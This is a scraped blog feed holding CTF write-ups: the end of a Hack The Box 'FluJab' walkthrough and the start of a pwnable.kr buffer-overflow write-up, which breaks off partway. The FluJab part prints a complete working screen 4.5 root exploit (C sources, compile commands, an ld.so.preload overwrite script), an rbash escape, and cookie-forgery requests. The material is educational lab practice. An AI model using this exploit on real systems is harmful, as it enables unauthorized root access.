&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag&quot;&gt;Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-ssh-access-i-found-myself-in-rbash-&quot;&gt;After getting ssh access I found myself in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-trying-some-stuff-i-could-bypass-it-by-adding-the--t-option-when-trying-to-ssh-&quot;&gt;After trying some stuff I could bypass it by adding the &lt;code class=&quot;highlighter-rouge&quot;&gt;-t&lt;/code&gt; option when trying to ssh :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t &quot;bash --noprofile&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-had-to-fix-my-path-&quot;&gt;Then I had to fix my path :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-did-some-regular-enumeration-steps-one-of-them-is-searching-for-suid-binaries-&quot;&gt;I did some regular enumeration steps, one of them is searching for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;one-thing-that-caught-my-attention-was-usrlocalsharescreenscreen&quot;&gt;One thing that caught my attention was &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-version-of-screen-&quot;&gt;I checked the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;screen -v&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-version-45-which-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-a-published-exploit-for-it-here-however-by-looking-at-that-exploit-&quot;&gt;It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;here&lt;/a&gt;. However by looking at that exploit :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-that-its-compiling-stuff-and-unfortunately-gcc-wasnt-installed-on-the-machine-&quot;&gt;We can see that it’s compiling stuff. And unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; wasn’t installed on the machine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/111.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-had-to-remove-the-c-code-from-the-exploit-and-create-separate-files-then-i-compiled-them&quot;&gt;So I had to remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; code from the exploit and create separate files. Then I compiled them.&lt;/h4&gt;
&lt;h4 id=&quot;libhaxc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown(&quot;/tmp/rootshell&quot;, 0, 0);
    chmod(&quot;/tmp/rootshell&quot;, 04755);
    unlink(&quot;/etc/ld.so.preload&quot;);
    printf(&quot;[+] done!\n&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;rootshellc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rootshell.c&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp(&quot;/bin/sh&quot;, NULL, NULL);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;compilation-&quot;&gt;Compilation :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -ldl -o libhax.so libhax.c&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o rootshell rootshell.c&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;exploitsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
/tmp/rootshell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-compiled-binaries-and-the-exploit-script-then-i-downloaded-them-on-the-machine-&quot;&gt;I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-when-i-ran-the-exploit-it-didnt-spawn-a-root-shell-&quot;&gt;But when I ran the exploit it didn’t spawn a root shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-because-i-forgot-that-the-suid-version-of-screen-was-in-usrlocalsharescreenscreen-the-other-one-had-problems-and-didnt-even-start-&quot;&gt;That’s because I forgot that the &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; was in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;. The other one had problems and didn’t even start :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-edited-the-path-in-the-exploit-code-&quot;&gt;So I edited the path in the exploit code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/115.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
/tmp/rootshell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/116.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---help&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="ssh" /><category term="rbash" /><category term="Binary Exploitation" /><category term="c" /><summary type="html">Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt; &amp;lt;div class=&quot;row aln-center&quot;&amp;gt; &amp;lt;div class=&quot;col-6 &quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;p&amp;gt; WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to access this page! &amp;lt;br \&amp;gt; If you are not supposed to change these settings then don't! whitelist will be auto-updated. &amp;lt;/p&amp;gt; &amp;lt;ul class=&quot;actions&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/form&amp;gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/flujab/0.png" /></entry><entry><title type="html">pwnable.kr - bof</title><link href="http://localhost:4000/pwn/bof/" rel="alternate" type="text/html" title="pwnable.kr - bof" /><published>2019-06-10T00:00:00+02:00</published><updated>2019-06-10T00:00:00+02:00</updated><id>http://localhost:4000/pwn/bof</id><content type="html" xml:base="http://localhost:4000/pwn/bof/">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-its-been-a-long-time-since-my-first-pwn-write-up--today-ill-write-about-another-challenge-from-pwnablekr-called-bof-it-was-a-simple-easy-buffer-overflow-challenge-you-can-also-check-these-by-overwriting-a-variable-we-can-get-a-shell-ill-also-write-a-small-exploit-with-pwntools-that-spawns-a-shell-automatically&quot;&gt;Hey guys it’s been a long time since my &lt;a href=&quot;https://0xrick.github.io/pwn/fd/&quot;&gt;first pwn write-up&lt;/a&gt;,  today I’ll write about another challenge from &lt;a href=&quot;https://pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called bof. It was a simple easy buffer overflow challenge (You can also check &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;these&lt;/a&gt;), by overwriting a variable we can get a shell. I’ll also write a small exploit with &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; that spawns a shell automatically.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;pretty-straightforward-we-have-the-vulnerable-binary-its-source-code-and-the-port-where-its-running&quot;&gt;Pretty straightforward, we have the vulnerable binary, its source code and the port where it’s running.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;code-analysis&quot;&gt;Code Analysis&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-code-&quot;&gt;Let’s take a look at the code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
void func(int key){
	char overflowme[32];
	printf(&quot;overflow me : &quot;);
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system(&quot;/bin/sh&quot;);
	}
	else{
		printf(&quot;Nah..\n&quot;);
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-are-two-functions-the-main-function-and-another-function-called-func&quot;&gt;There are two functions, the main function and another function called &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;func&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt;:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void func(int key){
	char overflowme[32];
	printf(&quot;overflow me : &quot;);
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system(&quot;/bin/sh&quot;);
	}
	else{
		printf(&quot;Nah..\n&quot;);
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;breakdown-&quot;&gt;Breakdown :&lt;/h4&gt;
&lt;h4 id=&quot;the-function-takes-a-variable-called-key-it-starts-by-creating-a-variable-called-overflowme-and-sets-a-buffer-of-32-chars-for-it--char-overflowme32&quot;&gt;The function takes a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, it starts by creating a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; and sets a buffer of 32 chars for it : &lt;code class=&quot;highlighter-rouge&quot;&gt;char overflowme[32];&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;then-it-prints-overflow-me--printfoverflow-me----and-waits-for-our-input-which-will-be-saved-in-the-variable-overflowme-getsoverflowme&quot;&gt;Then it prints &lt;code class=&quot;highlighter-rouge&quot;&gt;overflow me :&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;overflow me : &quot;);&lt;/code&gt;)  and waits for our input which will be saved in the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;gets(overflowme);&lt;/code&gt;)&lt;/h4&gt;
&lt;h4 id=&quot;after-that-theres-an-if-statement-that-checks-if-the-variable-key-is-equal-to-0xcafebabe-ifkey--0xcafebabe-if-thats-true-it-will-spawn-a-shell-systembinsh-if-key-is-equal-to-anything-else-it-will-print-nah-printfnahn&quot;&gt;After that there’s an if statement that checks if the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;if(key == 0xcafebabe){&lt;/code&gt;). If that’s true it will spawn a shell (&lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt;), if &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; is equal to anything else it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;Nah..&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Nah..\n&quot;);&lt;/code&gt;)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;main-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;basically-what-the-main-function-is-doing-is-just-calling-the-function-func-giving-key-the-value-of-0xdeadbeef&quot;&gt;Basically what the main function is doing is just calling the function &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt; giving &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-need-to-make-key-equal-to-0xcafebabe-instead-of-0xdeadbeef-to-make-it-spawn-a-shell-we-control-overflowme-but-we-dont-control-key-if-we-can-cause-a-buffer-overflow-we-will-be-able-to-overwrite-key-and-obviously-overflowme-is-vulnerable&quot;&gt;So we need to make &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; to make it spawn a shell. We control &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; but we don’t control &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;. If we can cause a buffer overflow we will be able to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, and obviously &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; is vulnerable.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;examining-the-binary-exploitation&quot;&gt;Examining the Binary, Exploitation&lt;/h3&gt;
&lt;h4 id=&quot;i-ran-the-program-and-tested-it-a-couple-of-times-first-one-with-a-short-input-&quot;&gt;I ran the program and tested it a couple of times. First one with a short input :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;second-one-with-a-longer-input-and-it-crashed&quot;&gt;Second one with a longer input and it crashed:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;important-thing-to-note-here-we-dont-want-to-know-the-offset-or-where-the-program-exactly-crashes-this-is-because-we-dont-need-to-overwrite-eip-we-need-to-overwrite-a-variables-value-and-thats-located-on-the-stack-so-giving-the-program-a-pattern-and-finding-the-offset-wont-help-because-we-need-to-know-where-0xdeadbeef-is-located-on-the-stack&quot;&gt;Important thing to note here, we don’t want to know the offset or where the program exactly crashes. This is because we don’t need to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;, we need to overwrite a variable’s value and that’s located on the stack. So giving the program a pattern and finding the offset won’t help because we need to know where &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; is located on the stack.&lt;/h4&gt;
&lt;h4 id=&quot;its-time-for-gdb-i-started-gdb-and-created-a-break-point-at-main-break-main-then-i-started-the-program-r-&quot;&gt;It’s time for &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;. I started &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; and created a break point at &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;break main&lt;/code&gt;) then I started the program (&lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-stopped-at-the-break-point-we-need-to-disassemble-the-function-func-to-get-the-address-of-the-compare-instruction-that-compares-between-the-value-of-key-and-0xcafebabe-to-set-another-break-point-there-and-look-at-the-stack&quot;&gt;It stopped at the break point. We need to disassemble the function &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt; to get the address of the compare instruction that compares between the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; to set another break point there and look at the stack.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;disas func&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-the-cmpl-compare-logical-instruction-at-0x0000654-lets-set-a-break-point-exactly-before-it-&quot;&gt;We can see the &lt;a href=&quot;https://www.ibm.com/support/knowledgecenter/en/ssw_aix_72/com.ibm.aix.alangref/idalangref_comp_logical_inst.htm&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; (Compare Logical)&lt;/a&gt; instruction at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000654&lt;/code&gt;, Lets set a break point exactly before it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;break *0x80000654&lt;/code&gt;
&lt;img src=&quot;/images/pwn/bof/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
